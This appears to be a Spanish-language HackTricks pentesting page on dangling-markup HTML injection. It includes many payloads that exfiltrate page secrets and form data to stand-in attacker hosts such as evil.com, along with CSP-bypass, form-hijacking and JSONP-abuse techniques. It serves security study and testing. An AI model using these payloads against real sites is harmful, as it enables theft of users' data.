# Dangling Markup - HTML scriptless injection

{{#include ../../banners/hacktricks-training.md}}

## Resumen

Esta técnica se puede usar para extraer información de un usuario cuando se encuentra una **inyección HTML**. Esto es muy útil si **no encuentras ninguna forma de explotar un** [**XSS**](../xss-cross-site-scripting/) pero puedes **inyectar algunas etiquetas HTML**.\
También es útil si algún **secreto está guardado en texto claro** en el HTML y deseas **exfiltrarlo** del cliente, o si deseas desviar la ejecución de algún script.

Varias técnicas comentadas aquí se pueden usar para eludir algunas [**Content Security Policy**](../content-security-policy-csp-bypass/) al exfiltrar información de maneras inesperadas (etiquetas html, CSS, etiquetas http-meta, formularios, base...).

## Aplicaciones Principales

### Robando secretos en texto claro

Si inyectas `<img src='http://evil.com/log.cgi?` cuando se carga la página, la víctima te enviará todo el código entre la etiqueta `img` inyectada y la siguiente comilla dentro del código. Si un secreto se encuentra de alguna manera en ese fragmento, lo robarás (puedes hacer lo mismo usando una comilla doble, observa cuál podría ser más interesante de usar).

Si la etiqueta `img` está prohibida (debido a CSP, por ejemplo), también puedes usar `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Ten en cuenta que **Chrome bloquea las URL HTTP** con "<" o "\n" en ellas, así que podrías intentar otros esquemas de protocolo como "ftp".

También puedes abusar de CSS `@import` (enviará todo el código hasta que encuentre un ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
También podrías usar **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
También podrías insertar una `<base` tag. Toda la información se enviará hasta que se cierre la comilla, pero requiere alguna interacción del usuario (el usuario debe hacer clic en algún enlace, porque la etiqueta base habrá cambiado el dominio al que apunta el enlace):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Robando formularios
```html
<base href="http://evil.com/" />
```
Entonces, los formularios que envían datos a la ruta (como `<form action='update_profile.php'>`) enviarán los datos al dominio malicioso.

### Robo de formularios 2

Establece un encabezado de formulario: `<form action='http://evil.com/log_steal'>` esto sobrescribirá el siguiente encabezado de formulario y todos los datos del formulario se enviarán al atacante.

### Robo de formularios 3

El botón puede cambiar la URL a la que se enviará la información del formulario con el atributo "formaction":
```html
<button name="xss" type="submit" formaction="https://google.com">
I get consumed!
</button>
```
Un atacante puede usar esto para robar la información.

Encuentra un [**ejemplo de este ataque en este informe**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### Robando secretos en texto claro 2

Usando la técnica mencionada más reciente para robar formularios (inyectando un nuevo encabezado de formulario) puedes luego inyectar un nuevo campo de entrada:
```html
<input type='hidden' name='review_body' value="
```
y este campo de entrada contendrá todo el contenido entre sus comillas dobles y la siguiente comilla doble en el HTML. Este ataque mezcla el "_**Robando secretos en texto claro**_" con "_**Robando forms2**_".

Puedes hacer lo mismo inyectando un formulario y una etiqueta `<option>`. Todos los datos hasta que se encuentre un `</option>` cerrado serán enviados:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Inyección de parámetros de formulario

Puedes cambiar la ruta de un formulario e insertar nuevos valores para que se realice una acción inesperada:
```html
<form action="/change_settings.php">
<input type="hidden" name="invite_user" value="fredmbogo" /> ← Injected lines

<form action="/change_settings.php">
← Existing form (ignored by the parser) ...
<input type="text" name="invite_user" value="" /> ← Subverted field ...
<input type="hidden" name="xsrf_token" value="12345" />
...
</form>
</form>
```
### Robando secretos en texto claro a través de noscript

`<noscript></noscript>` Es una etiqueta cuyo contenido será interpretado si el navegador no soporta javascript (puedes habilitar/deshabilitar Javascript en Chrome en [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Una forma de exfiltrar el contenido de la página web desde el punto de inyección hasta el final a un sitio controlado por el atacante será inyectar esto:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypass de CSP con interacción del usuario

De esta [investigación de portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) puedes aprender que incluso desde los entornos **más restringidos por CSP** aún puedes **exfiltrar datos** con algo de **interacción del usuario**. En esta ocasión vamos a usar la carga útil:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Tenga en cuenta que pedirá a la **víctima** que **haga clic en un enlace** que lo **redirigirá** a un **payload** controlado por usted. También tenga en cuenta que el atributo **`target`** dentro de la etiqueta **`base`** contendrá **contenido HTML** hasta la próxima comilla simple.\
Esto hará que el **valor** de **`window.name`** si se hace clic en el enlace sea todo ese **contenido HTML**. Por lo tanto, como usted **controla la página** a la que la víctima accede al hacer clic en el enlace, puede acceder a ese **`window.name`** y **exfiltrar** esos datos:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Flujo de trabajo engañoso 1 - Ataque de espacio de nombres HTML

Inserte una nueva etiqueta con un id dentro del HTML que sobrescriba la siguiente y con un valor que afecte el flujo de un script. En este ejemplo, está seleccionando con quién se va a compartir una información:
```html
<input type="hidden" id="share_with" value="fredmbogo" /> ← Injected markup ...
Share this status update with: ← Legitimate optional element of a dialog
<input id="share_with" value="" />

... function submit_status_update() { ... request.share_with =
document.getElementById('share_with').value; ... }
```
### Flujo de script engañoso 2 - Ataque de espacio de nombres de script

Crea variables dentro del espacio de nombres de javascript insertando etiquetas HTML. Luego, esta variable afectará el flujo de la aplicación:
```html
<img id="is_public" /> ← Injected markup ... // Legitimate application code
follows function retrieve_acls() { ... if (response.access_mode == AM_PUBLIC) ←
The subsequent assignment fails in IE is_public = true; else is_public = false;
} function submit_new_acls() { ... if (is_public) request.access_mode =
AM_PUBLIC; ← Condition always evaluates to true ... }
```
### Abuso de JSONP

Si encuentras una interfaz JSONP, podrías ser capaz de llamar a una función arbitraria con datos arbitrarios:
```html
<script src='/editor/sharing.js'>:              ← Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
set_sharing({ ... })
```
O también puedes intentar ejecutar algún javascript:
```html
<script src="/search?q=a&call=alert(1)"></script>
```
### Abuso de Iframe

Un documento hijo tiene la capacidad de ver y modificar la propiedad `location` de su padre, incluso en situaciones de origen cruzado. Esto permite la inserción de un script dentro de un **iframe** que puede redirigir al cliente a una página arbitraria:
```html
<html>
<head></head>
<body>
<script>
top.window.location = "https://attacker.com/hacked.html"
</script>
</body>
</html>
```
Esto se puede mitigar con algo como: `sandbox=' allow-scripts allow-top-navigation'`

Un iframe también puede ser abusado para filtrar información sensible de una página diferente **usando el atributo name del iframe**. Esto se debe a que puedes crear un iframe que se iframe a sí mismo abusando de la inyección HTML que hace que **la información sensible aparezca dentro del atributo name del iframe** y luego acceder a ese nombre desde el iframe inicial y filtrarlo.
```html
<script>
function cspBypass(win) {
win[0].location = "about:blank"
setTimeout(() => alert(win[0].name), 500)
}
</script>

<iframe
src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27"
onload="cspBypass(this.contentWindow)"></iframe>
```
Para más información, consulta [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuso

Puedes usar **`meta http-equiv`** para realizar **varias acciones** como establecer una Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` o realizar una redirección (en 5s en este caso): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Esto se puede **evitar** con un **CSP** respecto a **http-equiv** ( `Content-Security-Policy: default-src 'self';`, o `Content-Security-Policy: http-equiv 'self';`)

### Nuevo \<portal etiqueta HTML

Puedes encontrar una **investigación muy interesante** sobre vulnerabilidades explotables de la etiqueta \<portal [aquí](https://research.securitum.com/security-analysis-of-portal-element/).\
En el momento de escribir esto, necesitas habilitar la etiqueta portal en Chrome en `chrome://flags/#enable-portals` o no funcionará.
```html
<portal src='https://attacker-server?
```
### Fugas de HTML

No todas las formas de filtrar conectividad en HTML serán útiles para Dangling Markup, pero a veces podrían ayudar. Revísalas aquí: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Fugas

Esto es una **mezcla** entre **dangling markup y XS-Fugas**. Por un lado, la vulnerabilidad permite **inyectar HTML** (pero no JS) en una página de la **misma origen** de la que estaremos atacando. Por otro lado, no **atacaremos** directamente la página donde podemos inyectar HTML, sino **otra página**.

{{#ref}}
ss-leaks.md
{{#endref}}

## XS-Búsqueda/XS-Fugas

XS-Búsqueda está orientada a **exfiltrar información de origen cruzado** abusando de **ataques de canal lateral**. Por lo tanto, es una técnica diferente a Dangling Markup, sin embargo, algunas de las técnicas abusan de la inclusión de etiquetas HTML (con y sin ejecución de JS), como [**Inyección de CSS**](../xs-search/#css-injection) o [**Carga Perezosa de Imágenes**](../xs-search/#image-lazy-loading)**.**

{{#ref}}
../xs-search/
{{#endref}}

## Lista de Detección de Fuerza Bruta

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt
{{#endref}}

## Referencias

- [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
- [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
- [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
- [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{{#include ../../banners/hacktricks-training.md}}
